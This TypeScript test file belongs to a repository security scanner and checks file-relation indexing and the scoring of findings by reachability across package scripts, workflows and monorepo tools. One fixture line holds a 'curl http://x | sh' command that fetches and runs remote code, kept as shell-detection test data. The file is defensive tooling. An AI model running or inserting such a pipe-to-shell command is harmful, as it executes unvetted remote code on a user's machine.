import test from "node:test";
import assert from "node:assert/strict";
import type { Finding } from "../../../../../shared/src/index.js";
import type { FileRecord } from "../../../utils/file-system.js";
import { enrichFindingWithRelations, buildRelationIndex } from "../fileRelations.js";
import { detectScriptLanguage } from "../detectors/languageProfiles.js";

function file(relativePath: string, content: string): FileRecord {
  return { relativePath, absolutePath: relativePath, extension: "", content, size: content.length };
}

function finding(overrides: Partial<Finding>): Finding {
  return {
    id: overrides.id ?? "finding-1",
    ruleId: overrides.ruleId ?? "execution.suspicious-shell-spawn",
    title: overrides.title ?? "x",
    description: overrides.description ?? "x",
    summary: overrides.summary ?? "x",
    rationale: overrides.rationale ?? "x",
    recommendation: overrides.recommendation ?? "x",
    severity: overrides.severity ?? "high",
    confidence: overrides.confidence ?? 0.8,
    category: overrides.category ?? "execution",
    scoreContribution: overrides.scoreContribution ?? 10,
    filePath: overrides.filePath ?? "scripts/bootstrap",
    lineNumber: overrides.lineNumber,
    relatedLineNumbers: overrides.relatedLineNumbers,
    matchCount: overrides.matchCount,
    detector: overrides.detector ?? "test",
    evidenceSnippet: overrides.evidenceSnippet ?? "snippet",
    tags: overrides.tags ?? [],
    evidence: overrides.evidence ?? []
  };
}

test("detectScriptLanguage infers shell from shebang in extensionless file", () => {
  const language = detectScriptLanguage("scripts/bootstrap", "#!/bin/bash\nset -e\ncurl http://x | sh");
  assert.equal(language, "shell");
});

test("buildRelationIndex links package script to extensionless target file", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"bash scripts/bootstrap"}}'),
    file("scripts/bootstrap", "#!/bin/bash\necho hi")
  ];

  const index = buildRelationIndex(files);
  const refs = index.reverse.get("scripts/bootstrap") ?? [];
  assert.equal(refs[0]?.sourcePath, "package.json#start");
  assert.equal(refs[0]?.relation, "entrypoint");
});

test("enrichFindingWithRelations boosts reachable findings", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node scripts/loader.js"}}'),
    file("scripts/loader.js", 'require("child_process")')
  ];
  const index = buildRelationIndex(files);
  const enriched = enrichFindingWithRelations(finding({ filePath: "scripts/loader.js", confidence: 0.8, scoreContribution: 10 }), index);
  assert.ok(enriched.confidence > 0.8);
  assert.ok(enriched.scoreContribution > 10);
  assert.ok(enriched.tags.includes("reachable"));
});

test("buildRelationIndex resolves package script chains transitively", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"npm run bootstrap","bootstrap":"bash scripts/bootstrap.sh"}}'),
    file("scripts/bootstrap.sh", "#!/bin/bash\nsource ./parts/env.sh\n./runner"),
    file("scripts/parts/env.sh", "#!/bin/bash\necho ok"),
    file("scripts/runner", "#!/bin/bash\necho run")
  ];

  const index = buildRelationIndex(files);
  const envRefs = index.reverse.get("scripts/parts/env.sh") ?? [];
  const runnerRefs = index.reverse.get("scripts/runner") ?? [];
  assert.ok(envRefs.some((ref) => ref.sourcePath === "package.json#start" && ref.relation === "entrypoint"));
  assert.ok(runnerRefs.some((ref) => ref.sourcePath === "package.json#start" && ref.relation === "entrypoint"));
});

test("buildRelationIndex resolves workflow local actions and powershell calls", () => {
  const files = [
    file(".github/workflows/ci.yml", "jobs:\n  scan:\n    steps:\n      - uses: ./.github/actions/setup\n      - run: pwsh -File scripts/build.ps1"),
    file(".github/actions/setup/action.yml", "name: setup"),
    file("scripts/build.ps1", ". ./scripts/shared.ps1\n& ./scripts/runner.ps1"),
    file("scripts/shared.ps1", "Write-Host shared"),
    file("scripts/runner.ps1", "Write-Host run")
  ];

  const index = buildRelationIndex(files);
  const actionRefs = index.reverse.get(".github/actions/setup/action.yml") ?? [];
  const sharedRefs = index.reverse.get("scripts/shared.ps1") ?? [];
  const runnerRefs = index.reverse.get("scripts/runner.ps1") ?? [];
  assert.ok(actionRefs.some((ref) => ref.relation === "workflow-call"));
  assert.ok(sharedRefs.some((ref) => ref.relation === "workflow-call"));
  assert.ok(runnerRefs.some((ref) => ref.relation === "workflow-call"));
});


test("buildRelationIndex follows javascript local imports and python relative imports", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node src/main.js"}}'),
    file("src/main.js", 'import helper from "./helper.js"; const util = require("./lib/util");'),
    file("src/helper.js", 'export default 1'),
    file("src/lib/util.js", 'module.exports = 1'),
    file("tools/runner.py", 'from .pkg.loader import run\nimport tools.shared'),
    file("tools/pkg/loader.py", 'def run():\n  return 1'),
    file("tools/shared.py", 'VALUE = 1')
  ];

  const index = buildRelationIndex(files);
  const helperRefs = index.reverse.get("src/helper.js") ?? [];
  const utilRefs = index.reverse.get("src/lib/util.js") ?? [];
  const loaderRefs = index.reverse.get("tools/pkg/loader.py") ?? [];
  const sharedRefs = index.reverse.get("tools/shared.py") ?? [];
  assert.ok(helperRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(utilRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(loaderRefs.length >= 1);
  assert.ok(sharedRefs.length >= 1);
});

test("buildRelationIndex resolves tsconfig path aliases and baseUrl imports", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node src/main.ts"}}'),
    file("tsconfig.json", '{"compilerOptions":{"baseUrl":".","paths":{"@/*":["src/*"],"@lib/*":["lib/*"]}}}'),
    file("src/main.ts", 'import helper from "@/helper"; import tool from "@lib/tool"; import cfg from "config/env";'),
    file("src/helper.ts", 'export default 1'),
    file("lib/tool.ts", 'export default 1'),
    file("config/env.ts", 'export default {}')
  ];

  const index = buildRelationIndex(files);
  const helperRefs = index.reverse.get("src/helper.ts") ?? [];
  const toolRefs = index.reverse.get("lib/tool.ts") ?? [];
  const envRefs = index.reverse.get("config/env.ts") ?? [];
  assert.ok(helperRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(toolRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(envRefs.some((ref) => ref.sourcePath === "package.json#start"));
});

test("buildRelationIndex prefers nearest config for nested alias resolution", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node packages/app/src/main.ts"}}'),
    file("tsconfig.json", '{"compilerOptions":{"paths":{"@/*":["src/*"]}}}'),
    file("packages/app/tsconfig.json", '{"compilerOptions":{"baseUrl":".","paths":{"@/*":["src/*"]}}}'),
    file("packages/app/src/main.ts", 'import value from "@/inner/value";'),
    file("packages/app/src/inner/value.ts", 'export default 1'),
    file("src/inner/value.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const nestedRefs = index.reverse.get("packages/app/src/inner/value.ts") ?? [];
  const rootRefs = index.reverse.get("src/inner/value.ts") ?? [];
  assert.ok(nestedRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.equal(rootRefs.length, 0);
});

test("buildRelationIndex resolves local package imports via package name and exports", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node apps/web/src/main.ts"}}'),
    file("apps/web/src/main.ts", 'import core from "@repo/core"; import util from "@repo/core/utils";'),
    file("packages/core/package.json", '{"name":"@repo/core","main":"src/index.ts","exports":{".":"./src/index.ts","./utils":"./src/utils.ts"}}'),
    file("packages/core/src/index.ts", 'export default 1'),
    file("packages/core/src/utils.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const entryRefs = index.reverse.get("packages/core/src/index.ts") ?? [];
  const utilRefs = index.reverse.get("packages/core/src/utils.ts") ?? [];
  assert.ok(entryRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(utilRefs.some((ref) => ref.sourcePath === "package.json#start"));
});

test("buildRelationIndex falls back to package-local files for workspace import subpaths", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node apps/api/src/main.ts"}}'),
    file("apps/api/src/main.ts", 'import task from "toolkit/jobs/task";'),
    file("packages/toolkit/package.json", '{"name":"toolkit","main":"src/index.ts"}'),
    file("packages/toolkit/jobs/task.ts", 'export default 1')
  ];

  const index = buildRelationIndex(files);
  const taskRefs = index.reverse.get("packages/toolkit/jobs/task.ts") ?? [];
  assert.ok(taskRefs.some((ref) => ref.sourcePath === "package.json#start"));
});

test("buildRelationIndex respects root package workspaces when resolving local packages", () => {
  const files = [
    file("package.json", '{"workspaces":["packages/*"],"scripts":{"start":"node apps/web/src/main.ts"}}'),
    file("apps/web/src/main.ts", 'import core from "@repo/core"; import ignored from "@repo/ignored";'),
    file("packages/core/package.json", '{"name":"@repo/core","main":"src/index.ts"}'),
    file("packages/core/src/index.ts", 'export default 1'),
    file("vendor/ignored/package.json", '{"name":"@repo/ignored","main":"src/index.ts"}'),
    file("vendor/ignored/src/index.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const coreRefs = index.reverse.get("packages/core/src/index.ts") ?? [];
  const ignoredRefs = index.reverse.get("vendor/ignored/src/index.ts") ?? [];
  assert.ok(coreRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.equal(ignoredRefs.length, 0);
});

test("buildRelationIndex respects pnpm workspace packages when resolving local packages", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node apps/api/src/main.ts"}}'),
    file("pnpm-workspace.yaml", 'packages:\n  - "modules/*"\n'),
    file("apps/api/src/main.ts", 'import auth from "@repo/auth"; import misc from "@repo/misc";'),
    file("modules/auth/package.json", '{"name":"@repo/auth","main":"src/index.ts"}'),
    file("modules/auth/src/index.ts", 'export default 1'),
    file("misc/package.json", '{"name":"@repo/misc","main":"src/index.ts"}'),
    file("misc/src/index.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const authRefs = index.reverse.get("modules/auth/src/index.ts") ?? [];
  const miscRefs = index.reverse.get("misc/src/index.ts") ?? [];
  assert.ok(authRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.equal(miscRefs.length, 0);
});

test("buildRelationIndex resolves npm workspace commands to package script targets", () => {
  const files = [
    file("package.json", '{"workspaces":["packages/*"],"scripts":{"start":"npm run build --workspace app"}}'),
    file("packages/app/package.json", '{"name":"@repo/app","scripts":{"build":"node src/build.ts"}}'),
    file("packages/app/src/build.ts", 'export default 1')
  ];

  const index = buildRelationIndex(files);
  const refs = index.reverse.get("packages/app/src/build.ts") ?? [];
  assert.ok(refs.some((ref) => ref.sourcePath === "package.json#start"));
});

test("buildRelationIndex resolves pnpm filter and yarn workspace commands", () => {
  const files = [
    file("package.json", '{"workspaces":["packages/*"],"scripts":{"start":"pnpm --filter worker run build && yarn workspace ui build"}}'),
    file("packages/worker/package.json", '{"name":"worker","scripts":{"build":"node src/worker-build.ts"}}'),
    file("packages/worker/src/worker-build.ts", 'export default 1'),
    file("packages/ui/package.json", '{"name":"ui","scripts":{"build":"node src/ui-build.ts"}}'),
    file("packages/ui/src/ui-build.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const workerRefs = index.reverse.get("packages/worker/src/worker-build.ts") ?? [];
  const uiRefs = index.reverse.get("packages/ui/src/ui-build.ts") ?? [];
  assert.ok(workerRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(uiRefs.some((ref) => ref.sourcePath === "package.json#start"));
});

test("buildRelationIndex resolves turbo run filters to package script targets", () => {
  const files = [
    file("package.json", '{"workspaces":["packages/*"],"scripts":{"start":"turbo run build --filter=web"}}'),
    file("packages/web/package.json", '{"name":"web","scripts":{"build":"node src/web-build.ts"}}'),
    file("packages/web/src/web-build.ts", 'export default 1'),
    file("packages/api/package.json", '{"name":"api","scripts":{"build":"node src/api-build.ts"}}'),
    file("packages/api/src/api-build.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const webRefs = index.reverse.get("packages/web/src/web-build.ts") ?? [];
  const apiRefs = index.reverse.get("packages/api/src/api-build.ts") ?? [];
  assert.ok(webRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.equal(apiRefs.length, 0);
});

test("buildRelationIndex resolves nx and moon run commands", () => {
  const files = [
    file("package.json", '{"workspaces":["packages/*"],"scripts":{"start":"nx run admin:build && moon run worker:build"}}'),
    file("packages/admin/package.json", '{"name":"admin","scripts":{"build":"node src/admin-build.ts"}}'),
    file("packages/admin/src/admin-build.ts", 'export default 1'),
    file("packages/worker/package.json", '{"name":"worker","scripts":{"build":"node src/worker-build.ts"}}'),
    file("packages/worker/src/worker-build.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const adminRefs = index.reverse.get("packages/admin/src/admin-build.ts") ?? [];
  const workerRefs = index.reverse.get("packages/worker/src/worker-build.ts") ?? [];
  assert.ok(adminRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(workerRefs.some((ref) => ref.sourcePath === "package.json#start"));
});


test("buildRelationIndex resolves turbo task dependsOn chain for filtered package", () => {
  const files = [
    file("package.json", '{"workspaces":["packages/*"],"scripts":{"start":"turbo run build --filter=web"}}'),
    file("turbo.json", '{"tasks":{"build":{"dependsOn":["prep"]},"prep":{}}}'),
    file("packages/web/package.json", '{"name":"web","scripts":{"build":"node src/build.ts","prep":"node src/prep.ts"}}'),
    file("packages/web/src/build.ts", 'export default 1'),
    file("packages/web/src/prep.ts", 'export default 2'),
    file("packages/api/package.json", '{"name":"api","scripts":{"build":"node src/api-build.ts","prep":"node src/api-prep.ts"}}'),
    file("packages/api/src/api-build.ts", 'export default 3'),
    file("packages/api/src/api-prep.ts", 'export default 4')
  ];

  const index = buildRelationIndex(files);
  const webBuildRefs = index.reverse.get("packages/web/src/build.ts") ?? [];
  const webPrepRefs = index.reverse.get("packages/web/src/prep.ts") ?? [];
  const apiPrepRefs = index.reverse.get("packages/api/src/api-prep.ts") ?? [];
  assert.ok(webBuildRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(webPrepRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.equal(apiPrepRefs.length, 0);
});

test("buildRelationIndex resolves nx project targets without package json", () => {
  const files = [
    file("package.json", '{"workspaces":["apps/*"],"scripts":{"start":"nx run admin:build"}}'),
    file("apps/admin/project.json", '{"name":"admin","targets":{"build":{"options":{"main":"src/main.ts"}}}}'),
    file("apps/admin/src/main.ts", 'export default 1')
  ];

  const index = buildRelationIndex(files);
  const refs = index.reverse.get("apps/admin/src/main.ts") ?? [];
  assert.ok(refs.some((ref) => ref.sourcePath === "package.json#start"));
});


test("buildRelationIndex resolves nx targetDefaults dependency graph across implicitDependencies", () => {
  const files = [
    file("package.json", '{"workspaces":["apps/*","libs/*"],"scripts":{"start":"nx run admin:build"}}'),
    file("nx.json", '{"targetDefaults":{"build":{"dependsOn":["^build"]}},"projects":{"admin":{"implicitDependencies":["shared"]}}}'),
    file("apps/admin/project.json", '{"name":"admin","implicitDependencies":["shared"],"targets":{"build":{"options":{"main":"src/main.ts"}}}}'),
    file("apps/admin/src/main.ts", 'export default 1'),
    file("libs/shared/project.json", '{"name":"shared","targets":{"build":{"options":{"main":"src/index.ts"}}}}'),
    file("libs/shared/src/index.ts", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const adminRefs = index.reverse.get("apps/admin/src/main.ts") ?? [];
  const sharedRefs = index.reverse.get("libs/shared/src/index.ts") ?? [];
  assert.ok(adminRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(sharedRefs.some((ref) => ref.sourcePath === "package.json#start"));
});


test("buildRelationIndex resolves turbo ^task through inferred workspace import graph", () => {
  const files = [
    file("package.json", '{"workspaces":["packages/*"],"scripts":{"start":"turbo run build --filter=web"}}'),
    file("turbo.json", '{"tasks":{"build":{"dependsOn":["^build"]}}}'),
    file("packages/web/package.json", '{"name":"web","scripts":{"build":"node src/main.ts"}}'),
    file("packages/web/src/main.ts", 'import core from "core"; export default core;'),
    file("packages/core/package.json", '{"name":"core","scripts":{"build":"node src/index.ts"},"main":"src/index.ts"}'),
    file("packages/core/src/index.ts", 'export default 1')
  ];

  const index = buildRelationIndex(files);
  const webRefs = index.reverse.get("packages/web/src/main.ts") ?? [];
  const coreRefs = index.reverse.get("packages/core/src/index.ts") ?? [];
  assert.ok(webRefs.some((ref) => ref.sourcePath === "package.json#start"));
  assert.ok(coreRefs.some((ref) => ref.sourcePath === "package.json#start"));
});


test("enrichFindingWithRelations boosts direct execution-path files more than deeper files", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"bash scripts/bootstrap.sh"}}'),
    file("scripts/bootstrap.sh", "./scripts/runner.sh"),
    file("scripts/runner.sh", "source ./scripts/final.sh"),
    file("scripts/final.sh", "echo done")
  ];

  const index = buildRelationIndex(files);
  const direct = enrichFindingWithRelations(finding({ filePath: "scripts/bootstrap.sh", confidence: 0.5, scoreContribution: 10 }), index);
  const deep = enrichFindingWithRelations(finding({ filePath: "scripts/final.sh", confidence: 0.5, scoreContribution: 10 }), index);
  assert.ok(direct.confidence > deep.confidence);
  assert.ok(direct.scoreContribution > deep.scoreContribution);
  assert.ok(direct.tags.includes("directly-reachable"));
});

test("enrichFindingWithRelations boosts files referenced by multiple entrypoints", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"bash scripts/a.sh && bash scripts/b.sh"}}'),
    file("scripts/a.sh", '. ./scripts/shared.sh\n. ./scripts/single.sh'),
    file("scripts/b.sh", '. ./scripts/shared.sh'),
    file("scripts/shared.sh", 'echo shared'),
    file("scripts/single.sh", 'echo single')
  ];

  const index = buildRelationIndex(files);
  const shared = enrichFindingWithRelations(finding({ filePath: "scripts/shared.sh", confidence: 0.5, scoreContribution: 10 }), index);
  const single = enrichFindingWithRelations(finding({ filePath: "scripts/single.sh", confidence: 0.5, scoreContribution: 10 }), index);
  assert.ok(shared.confidence > single.confidence);
  assert.ok(shared.scoreContribution > single.scoreContribution);
  assert.ok(shared.tags.includes("multi-entrypoint"));
  assert.ok(shared.evidence.some((item) => item.label === "Execution path strength"));
});


test("enrichFindingWithRelations prioritizes workflow-linked files", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"node scripts/local.js"}}'),
    file("scripts/local.js", 'export default 1'),
    file(".github/workflows/build.yml", 'jobs:\n  scan:\n    steps:\n      - uses: ./.github/actions/run-local'),
    file(".github/actions/run-local/action.yml", 'runs:\n  using: composite\n  steps:\n    - run: node scripts/workflow.js'),
    file("scripts/workflow.js", 'export default 2')
  ];

  const index = buildRelationIndex(files);
  const local = enrichFindingWithRelations(finding({ filePath: "scripts/local.js", confidence: 0.5, scoreContribution: 10 }), index);
  const workflow = enrichFindingWithRelations(finding({ filePath: "scripts/workflow.js", confidence: 0.5, scoreContribution: 10 }), index);
  assert.ok(workflow.confidence > local.confidence);
  assert.ok(workflow.scoreContribution > local.scoreContribution);
  assert.ok(workflow.tags.includes("workflow-linked"));
  assert.ok(workflow.evidence.some((item) => item.label === "Execution ownership"));
});


test("enrichFindingWithRelations deprioritizes supporting test paths", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"bash scripts/bootstrap.sh"}}'),
    file("scripts/bootstrap.sh", '. ./src/primary.sh\n. ./tests/fixture.sh'),
    file("src/primary.sh", 'echo primary'),
    file("tests/fixture.sh", 'echo fixture')
  ];

  const index = buildRelationIndex(files);
  const primary = enrichFindingWithRelations(finding({ filePath: "src/primary.sh", confidence: 0.5, scoreContribution: 10 }), index);
  const fixture = enrichFindingWithRelations(finding({ filePath: "tests/fixture.sh", confidence: 0.5, scoreContribution: 10 }), index);
  assert.ok(primary.confidence > fixture.confidence);
  assert.ok(primary.scoreContribution > fixture.scoreContribution);
  assert.ok(primary.tags.includes("primary-execution-path"));
  assert.ok(fixture.tags.includes("supporting-path"));
});


test("enrichFindingWithRelations deprioritizes generated build paths", () => {
  const files = [
    file("package.json", '{"scripts":{"start":"bash scripts/bootstrap.sh"}}'),
    file("scripts/bootstrap.sh", '. ./src/runtime.sh\n. ./dist/generated.sh'),
    file("src/runtime.sh", 'echo runtime'),
    file("dist/generated.sh", 'echo generated')
  ];

  const index = buildRelationIndex(files);
  const runtime = enrichFindingWithRelations(finding({ filePath: "src/runtime.sh", confidence: 0.5, scoreContribution: 10 }), index);
  const generated = enrichFindingWithRelations(finding({ filePath: "dist/generated.sh", confidence: 0.5, scoreContribution: 10 }), index);
  assert.ok(runtime.confidence > generated.confidence);
  assert.ok(runtime.scoreContribution > generated.scoreContribution);
  assert.ok(generated.tags.includes("generated-path"));
});
